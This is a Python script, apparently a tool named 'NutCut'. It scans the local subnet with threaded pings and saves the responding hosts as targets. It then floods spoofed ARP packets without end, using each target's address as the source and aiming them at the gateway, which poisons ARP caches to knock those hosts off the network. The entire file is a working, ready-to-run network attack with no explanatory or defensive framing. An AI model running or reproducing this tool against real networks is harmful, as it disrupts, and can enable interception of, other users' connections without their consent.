from warnings import filterwarnings
filterwarnings("ignore")
from scapy.all import *
import os, threading, socket

def getIpList():

    def getOwnIp():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip_address = s.getsockname()[0]
        s.close()
        print('Local IP address:', local_ip_address)
        return local_ip_address

    LocalIp = getOwnIp()

    baseIp = ".".join(str(LocalIp).split(".")[:3])

    alive = []

    def ping(ip):
        response = os.popen(f"ping -n 5 {ip}").read()
        if "Impossible" in response or "unreachable" in response:
            pass
        else:
            alive.append(ip)

    threads = []
    print("Scanning network...")
    for i in range(1, 255):
        ip = baseIp + "." + str(i)
        t = threading.Thread(target=ping, args=(ip,))
        threads.append(t)

    for t in threads:
        t.start()

    for t in threads:
        t.join()

    print("Network IPs:", alive)
    print("Network size:", len(alive))
    f = open("./target_ips.txt", "w")
    for ip in alive:
        if ip != LocalIp:
            f.write(f"{ip}\n")
    f.close()
    return alive


ipList = getIpList()

try:
    gateway_ip = conf.route.route("0.0.0.0")[2]
except Exception:
    print("Error: Unable to get gateway IP")
    exit()

def nutcut(target_ip):
    pkt = ARP(psrc=target_ip, pdst=gateway_ip)
    send(pkt, verbose=0, loop=1)

def main():

    if not os.path.exists("./target_ips.txt"):
        open("./target_ips.txt", "w")
        print("Error: target_ips.txt not found. Created for you, please edit it")
        return
    
    with open("./target_ips.txt", "r") as file:
        target_list = file.read().strip().splitlines()
        file.close()
    
    if not target_list:
        print("Error: target_ips.txt is empty. Please edit it first")
        return

    for target_ip in target_list:
        print(f"NutCut initializing agaisn't {target_ip}")
        threading.Thread(target=nutcut, args=[target_ip], daemon=True).start()

    try:
        print(f"Target Count: {len(target_list)}\n")
        input("\n: Press Enter or CTRL+C to stop :")
    except KeyboardInterrupt:
        return

if __name__ == "__main__":
    print("\033[?25l", end="")
    main()
    print("\033[?25h", end="")
